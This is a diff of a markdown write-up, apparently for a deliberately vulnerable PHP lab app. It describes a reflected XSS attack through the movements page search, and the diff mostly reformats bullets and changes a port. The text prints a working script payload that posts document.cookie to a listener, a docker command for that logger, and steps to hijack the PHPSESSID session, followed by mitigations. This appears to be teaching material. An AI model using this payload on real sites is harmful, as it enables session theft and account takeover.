@@ -4,19 +4,19 @@ This attack will exploit the search function on the movements page to grab the c
 
 ## Steps
 
-- Listen on your machine for connections
+-   Listen on your machine for connections
 
     `docker run -it --rm --name node-logger -p 8000:8000 -v ${PWD}:/usr/src/app -w /usr/src/app node:alpine node logger.js`
 
-- Create a malicious link
+-   Create a malicious link
 
-    `http://localhost:5000/movements.php?search="/><script>fetch("http://127.0.0.1:8000", {method:"POST", mode: "no-cors", body: document.cookie})</script>`
+    `http://localhost:80/movements.php?search="/><script>fetch("http://127.0.0.1:8000", {method:"POST", mode: "no-cors", body: document.cookie})</script>`
 
-- Have the user visit the malicious link
-- Grab the PHPSESSID cookie and take ownership of the account
+-   Have the user visit the malicious link
+-   Grab the PHPSESSID cookie and take ownership of the account
 
 ## Mitigation
 
-- Sanitize sent and received data [htmlspecialchars()](https://www.php.net/manual/en/function.htmlspecialchars.php) function
-- Use appropriate response headers
-- Use Content Security Policy
+-   Sanitize sent and received data [htmlspecialchars()](https://www.php.net/manual/en/function.htmlspecialchars.php) function
+-   Use appropriate response headers
+-   Use Content Security Policy
